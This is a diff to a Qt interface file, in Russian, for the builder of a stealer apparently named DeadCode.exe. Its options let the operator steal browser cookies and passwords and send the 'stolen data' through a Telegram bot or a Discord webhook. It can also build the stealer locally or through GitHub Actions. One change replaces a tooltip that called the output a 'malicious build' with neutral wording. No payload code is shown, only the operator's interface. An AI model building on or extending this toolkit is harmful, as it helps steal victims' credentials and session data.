@@ -235,7 +235,7 @@
               <string>Кража куки браузеров</string>
              </property>
              <property name="toolTip">
-              <string>Кража куки из браузеров: Chrome, Edge, Firefox, Opera, Yandex и др.</string>
+              <string>Кража куки из браузеров: Chrome</string>
              </property>
             </widget>
            </item>
@@ -245,7 +245,7 @@
               <string>Кража паролей браузеров</string>
              </property>
              <property name="toolTip">
-              <string>Кража паролей из браузеров: Chrome, Edge, Firefox, Opera, Yandex и др.</string>
+              <string>Кража паролей из браузеров: Chrome</string>
              </property>
             </widget>
            </item>
@@ -432,7 +432,7 @@
           <string>Метод отправки данных:</string>
          </property>
          <property name="toolTip">
-          <string>Выберите метод отправки собранных данных</string>
+          <string>Выберите способ отправки собранных данных</string>
          </property>
         </widget>
        </item>
@@ -457,7 +457,7 @@
           <string>Local File</string>
          </property>
          <property name="toolTip">
-          <string>Local File: сохранение на диск, Telegram: отправка через бота, Discord: через вебхук</string>
+          <string>Local File: сохранение на диск, Telegram: через бота, Discord: через вебхук</string>
          </property>
         </widget>
        </item>
@@ -467,7 +467,7 @@
           <string>Метод сборки:</string>
          </property>
          <property name="toolTip">
-          <string>Выберите метод сборки программы</string>
+          <string>Выберите способ сборки программы</string>
          </property>
         </widget>
        </item>
@@ -487,7 +487,7 @@
           <string>Local Build</string>
          </property>
          <property name="toolTip">
-          <string>Local Build: сборка на локальной машине, GitHub Actions: сборка через CI/CD</string>
+          <string>Local Build: локальная сборка, GitHub Actions: через CI/CD</string>
          </property>
         </widget>
        </item>
@@ -497,7 +497,7 @@
           <string>GitHub Token:</string>
          </property>
          <property name="toolTip">
-          <string>Токен для доступа к GitHub API (для сборки через GitHub Actions)</string>
+          <string>Токен для доступа к GitHub API</string>
          </property>
         </widget>
        </item>
@@ -507,7 +507,7 @@
           <string>Введите GitHub Token</string>
          </property>
          <property name="toolTip">
-          <string>Введите токен для доступа к GitHub API (оставьте пустым для локальной сборки)</string>
+          <string>Токен для GitHub Actions (оставьте пустым для локальной сборки)</string>
          </property>
         </widget>
        </item>
@@ -517,7 +517,7 @@
           <string>GitHub Repository:</string>
          </property>
          <property name="toolTip">
-          <string>Репозиторий для сборки через GitHub Actions (формат: username/repo)</string>
+          <string>Репозиторий для сборки через GitHub Actions</string>
          </property>
         </widget>
        </item>
@@ -527,47 +527,47 @@
           <string>Введите GitHub Repository (username/repo)</string>
          </property>
          <property name="toolTip">
-          <string>Введите репозиторий в формате username/repo (оставьте пустым для локальной сборки)</string>
+          <string>Репозиторий в формате username/repo (оставьте пустым для локальной сборки)</string>
          </property>
         </widget>
        </item>
        <item row="4" column="0">
-        <widget class="QLabel" name="tokenLabel">
+        <widget class="QLabel" name="telegramTokenLabel">
          <property name="text">
-          <string>Токен:</string>
+          <string>Telegram Bot Token:</string>
          </property>
          <property name="toolTip">
-          <string>Токен для Telegram бота или Discord вебхука</string>
+          <string>Токен для отправки данных через Telegram</string>
          </property>
         </widget>
        </item>
        <item row="4" column="1">
         <widget class="QLineEdit" name="tokenLineEdit">
          <property name="placeholderText">
-          <string>Введите токен Telegram или Discord</string>
+          <string>Введите токен Telegram бота</string>
          </property>
          <property name="toolTip">
-          <string>Введите токен бота Telegram или вебхука Discord</string>
+          <string>Токен бота Telegram для отправки украденных данных</string>
          </property>
         </widget>
        </item>
        <item row="5" column="0">
-        <widget class="QLabel" name="chatIdLabel">
+        <widget class="QLabel" name="telegramChatIdLabel">
          <property name="text">
-          <string>Chat ID:</string>
+          <string>Telegram Chat ID:</string>
          </property>
          <property name="toolTip">
-          <string>Chat ID для Telegram (для Discord оставьте пустым)</string>
+          <string>ID чата для отправки данных в Telegram</string>
          </property>
         </widget>
        </item>
        <item row="5" column="1">
         <widget class="QLineEdit" name="chatIdLineEdit">
          <property name="placeholderText">
-          <string>Введите Chat ID (для Telegram)</string>
+          <string>Введите Chat ID для Telegram</string>
          </property>
          <property name="toolTip">
-          <string>Введите Chat ID для Telegram (оставьте пустым для Discord)</string>
+          <string>ID чата Telegram для получения данных</string>
          </property>
         </widget>
        </item>
@@ -577,17 +577,17 @@
           <string>Discord Webhook:</string>
          </property>
          <property name="toolTip">
-          <string>Webhook URL для Discord (для Telegram оставьте пустым)</string>
+          <string>URL вебхука для отправки данных в Discord</string>
          </property>
         </widget>
        </item>
        <item row="6" column="1">
         <widget class="QLineEdit" name="discordWebhookLineEdit">
          <property name="placeholderText">
-          <string>Введите Webhook URL (для Discord)</string>
+          <string>Введите Webhook URL для Discord</string>
          </property>
          <property name="toolTip">
-          <string>Введите Webhook URL для Discord (оставьте пустым для Telegram)</string>
+          <string>URL вебхука Discord для отправки украденных данных</string>
          </property>
         </widget>
        </item>
@@ -597,7 +597,7 @@
           <string>Имя файла:</string>
          </property>
          <property name="toolTip">
-          <string>Имя выходного файла программы</string>
+          <string>Имя выходного исполняемого файла</string>
          </property>
         </widget>
        </item>
@@ -610,7 +610,7 @@
           <string>Введите имя выходного файла</string>
          </property>
          <property name="toolTip">
-          <string>Введите имя выходного файла (например, DeadCode.exe)</string>
+          <string>Имя выходного файла (по умолчанию: DeadCode.exe)</string>
          </property>
         </widget>
        </item>
@@ -632,7 +632,7 @@
           <string>Выберите файл иконки (.ico)</string>
          </property>
          <property name="toolTip">
-          <string>Путь к выбранному файлу иконки (.ico)</string>
+          <string>Путь к файлу иконки (.ico) для исполняемого файла</string>
          </property>
         </widget>
        </item>
@@ -642,7 +642,7 @@
           <string>Обзор...</string>
          </property>
          <property name="toolTip">
-          <string>Открыть диалог для выбора файла иконки (.ico)</string>
+          <string>Выбрать файл иконки (.ico)</string>
          </property>
          <property name="icon">
           <iconset theme="document-open"/>
@@ -658,7 +658,7 @@
        <string>Собрать</string>
       </property>
       <property name="toolTip">
-       <string>Запустить процесс сборки вредоносного билда с выбранными параметрами</string>
+       <string>Собрать программу с выбранными настройками</string>
       </property>
       <property name="icon">
        <iconset theme="system-run"/>
